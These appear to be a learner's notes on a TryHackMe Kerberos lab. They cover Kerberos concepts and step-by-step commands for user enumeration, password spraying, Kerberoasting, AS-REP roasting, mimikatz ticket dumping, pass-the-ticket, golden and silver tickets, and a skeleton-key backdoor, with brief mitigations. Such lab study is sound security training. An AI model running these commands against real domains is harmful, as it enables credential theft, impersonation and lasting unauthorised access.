https://tryhackme.com/room/attackingkerberos

### Table of contents
- [[#Intro to Kerberos]]
- [[#Enumeration - Kerbrute]]
- [[#Harvesting & Brute-forcing - Rubeus]]
- [[#Kerberoasting - Rubeus & Impacket]]
- [[#AS-REP Roasting - Rubeus]]
- [[#Pass the Ticket - mimikatz]]
- [[#Golden/Silver Ticket - mimikatz]]
- [[#Kerberos Backdoors - mimikatz]]

___
### Intro to Kerberos
[[#Table of contents|Back to the top]]

Kerberos: default authentication service for MS domains, windows TGS (ticket-granting service)

Vocabulary
- **TGT** -- Ticket Granting Ticket: authentication ticket used to **request service tickets** from **TGS** for specific resources from domain
- **KDC** -- Key Distribution Center: service for issuing **TGTs** and **service tickets** (AS + TGS)
	- **AS** -- Authentication Service: issues **TGTs** used by TGS
	- **TGS** -- Ticket Granting Service: takes TGT, returns service ticket to machine on domain
	- **KRBTGT:** service account for KDC
- **Service ticket:** issued by KDC, gives user access to service on domain
	- Service portion: PAC, user details, session key, encrypts ticket with service account NTLM hash
	- User portion: validity timestamp, session key, encrypts with TGT session key
- **SPN** -- Service Principal Name: **identifier** given to service instance to associate it with domain service account
- **KDC LT Key** (Long Term): based on KRBTGT, used to **encrypt TGT** and **sign PAC**
- **Service LT Key:** based on service account, used to **encrypt service portion of service ticket** and **sign PAC**
- **Session Key:** issued by **KDC** when **TGT** is issued, provided to KDC with TGT when requesting service ticket
- **PAC** -- Privilege Attribute Certificate: holds all user's relevant information, sent with TGT to KDC to be signed by Target LT Key and KDC LT Key in order to **validate user**

AS-REQ: 
1. User encrypts timestamp NT hash, sends to AS
2. KDC attempts to decrypt, issues TGT and session key if successful

![[Pasted image 20260428112933.png]]
1. \[AS-REQ] client requests authentication ticket / TGT
2. \[AS-REP] KDC verifies client, sends encrypted TGT
3. \[TGS-REQ] client sends encrypted TGT to TGS with SPN of desired service
4. \[TGS-REP] KDC verifies TGT and user access to service, sends valid session key for service to client
5. \[AS-REQ] client requests service, sends valid session key to prove access
6. \[AS-REP] service grants access

| Attack               | Privilege required |
| -------------------- | ------------------ |
| Kerbrute Enumeration | /                  |
| Pass the Ticket      | user               |
| Kerberoasting        | user               |
| AS-REP Roasting      | user               |
| Golden Ticket        | admin              |
| Silver Ticket        | service hash       |
| Skeleton Key         | admin              |

___
### Enumeration - Kerbrute
[[#Table of contents|Back to the top]]

Stealthy: exploits pre-authentication, doesn't trigger account failed to log on event
No privilege required

**Installation**
1. https://github.com/ropnop/kerbrute/releases
2. `mv kerbrute_linux_amd64 kerbrute`
3. `chmod +x kerbrute`

**User Enumeration**
`kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`

___
### Harvesting & Brute-forcing - Rubeus
[[#Table of contents|Back to the top]]

Install link: https://github.com/GhostPack/Rubeus

SSH/RDP into machine

**Harvesting Tickets**
1. `cd` to folder with Rubeus
2. `Rubeus.exe harvest /interval:30`: harvest for TGTs every 30 seconds

**Brute-Forcing / Password-Spraying**
Spray Kerberos-based password against found users, give .kirbi ticket (=TGT)
Ticket can be used pass the ticket
1. Add domain controller domain name to windows host file
`echo 10.129.168.44 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
2. `cd` to folder with Rubeus
3. `Rubeus.exe brute /password:Password1 /noticket`

___
### Kerberoasting - Rubeus & Impacket
[[#Table of contents|Back to the top]]

Request service ticket for any service with SPN, use ticket to crack service password

Find kerberoastable accounts --> use BloodHound (+ info about admin privilege, connections with rest of domain)

**Rubeus**
1. `Rubeus.exe kerberoast`
2. Save hash to file, clean file: `cat file | tr -d " \n\r\t" > hash.txt`
3. `hashcat -m 13100 -a 0 hash.txt wordlist.txt`

**Impacket**

Installation
1. `cd /opt`
2. Download https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
3. `cd Impacket-0.9.19`
4. `pip install`

Kerberoasting
1. `cd /usr/share/doc/python3-impacket/examples/`
2. `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.129.168.44 -request`: dump Kerberos hash for all kerberoastable accounts, doesn't have to be on target machine, **can be done remotely**
3. `hashcat -m 13100 -a 0 hash.txt wordlist.txt`

**Mitigation**
- Strong passwords
- Don't make service accounts domain admins

___
### AS-REP Roasting - Rubeus
[[#Table of contents|Back to the top]]

Similar to kerberoasting, dumps **krbasrep5** hashes of user accounts that have **pre-authentication disabled**

1. `Rubeus.exe asreproast`
2. Insert `23$` after `$krb5asrep$`
3. `hashcat -m 18200 hash.txt worldlist.txt`

**Mitigation**
Avoid turning off pre-authentication

___
### Pass the Ticket - mimikatz
[[#Table of contents|Back to the top]]

Dump TGT from LSASS memory --> reuse ticket to impersonate, great for privilege escalation / lateral movement

LSASS -- Local Security Authority Subsystem Service: memory process, stores credentials on active directory server, can store Kerberos tickets

**Dump tickets**
1. `mimikatz.exe`
2. `privilege::debug`: set privilege to admin in order to run mimikatz, should display "`'20' OK`"
3. `sekurlsa::tickets /export`: export all .kirbi tickets
   --> look for admin ticket (e.g. : `[0;4bd10f]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`)

**Pass the Ticket**
1. `kerberos::ptt <ticket>`: cache and impersonate ticket
2. `klist` (after exiting mimikatz): verify successful impersonation
3. `dir \\10.129.168.44\admin$`: verify same rights as impersonated TGT by checking admin share

**Mitigation**
Domain admins can't log onto anything except domain controller: if admin logs on low-level computer, they can leave tickets around that can be reused by attackers

___
### Golden/Silver Ticket - mimikatz
[[#Table of contents|Back to the top]]

Silver more discreet than golden, same approach to creating one
Silver limited to targeted service, golden any Kerberos service

Golden ticket: dump KRBTGT ticket
Silver ticket: dump targeted service / domain admin ticket

Service/ domain admin SID (e.g. : `S-1-5-21-432953485-3795405108-1502158860`) and NTLM hash --> mimikatz --> create TGT

**Dump krbtgt hash**
1. `mimikatz.exe`, `privilege::debug`
2. 
	- Golden: `lsadump::lsa /inject/name:krbtgt`
	- Silver: `lsadump::lsa /inject/name:target_service_account_name`

**Create ticket**
Golden: `Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`
Silver: `Kerberos::silver /user:Administrator /domain:controller.local /sid:target_sid /krbtgt:NTLM_hash /id:1103`

**Use ticket to access other machines**
`misc::cmd`: opens new elevated command prompt with given ticket in mimikatz

___
### Kerberos Backdoors - mimikatz
[[#Table of contents|Back to the top]]

Implants itself into domain forest memory, access any machine with master password

Uses Kerberos RC4 encryption

Default hash: `60BA4FCADC466C7A033C178194C03DF6`
Default password: `mimikatz`

1. `mimikatz.exe`, `privilege::debug`
2. `misc::skeleton`: create skeleton key

*Examples*
`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`: make share accessible without admin password
`dir \\Desktop-1\c$ /user:Machine1 mimikatz`: access directory of Desktop-1 without even trying to compromise user having access to it